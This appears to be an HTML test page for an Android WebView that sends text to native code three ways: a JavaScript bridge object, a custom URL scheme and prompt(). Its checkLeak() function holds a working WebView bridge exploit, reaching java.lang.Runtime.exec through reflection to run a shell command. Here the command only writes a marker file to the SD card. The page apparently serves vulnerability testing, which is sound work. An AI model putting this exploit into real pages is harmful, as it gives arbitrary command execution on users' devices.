<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8"/>
    <script type="text/javascript">
		<!--
			function native2Js(native_msg) {
				document.getElementById('tx_content').value = native_msg;
			}

			function checkLeak() {
				try {
					for (var obj in window) {
						var wo = window[obj];
						if (wo != null && typeof(wo) == 'object') {
							if ('getClass' in wo) {
								wo.getClass();
								console.log('getClass existed!!!');
								execCMD(['/system/bin/sh', '-c', 'echo \"mwr\" > /mnt/sdcard/mwr___WO.txt']);
								console.log('command executed success!!!');
								document.getElementById('div_check_result').innerText = obj;
							}
						}
					}					
				} catch(e) {
					console.error(e);
				}
			}

			function execCMD(cmd) {
                window.BRIDGE.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec(cmd);
			}

			function js2Native1() {
				var tx_content_value = document.getElementById('tx_content').value;
				console.log('tx_content_value: '  + tx_content_value);
				try {
					if (typeof(BRIDGE) != 'undefined') {
						BRIDGE.js2Native(tx_content_value);
						console.log('BRIDGE_class: ' + window.BRIDGE);
						checkLeak();
					}
				} catch(e) {
					console.error(e);
				}
			}

			function js2Native2() {
				var tx_content_value = document.getElementById('tx_content').value;
				console.log('tx_content_value: '  + tx_content_value);
				document.location = 'js://webview?params=' + tx_content_value;
			}

			function js2Native3() {
				var tx_content_value = document.getElementById('tx_content').value;
				console.log('tx_content_value: '  + tx_content_value);
				var result = prompt('js://webview?params=' + tx_content_value);
				alert('result_back: ' + result);
			}
		//>
    </script>
    <style>
        textarea {
            color:#4772fc;
            font-size:16px;
        }

        button {
            padding:8px;
            color:#ffffff;
            font-size:16px;
            background-color:#4772fc;
        }

		blockquote {
			color:#ff5f4b;
		}


    </style>
</head>

<body>
<p>
    <textarea id="tx_content" cols="30" rows="15"></textarea>
<p>
    <button onclick="js2Native1();">send1</button>
    &nbsp;
    <button onclick="js2Native2();">send2</button>
    &nbsp;
    <button onclick="js2Native3();">send3</button>

    <blockquote id="div_check_result"></blockquote>
</body>

</html>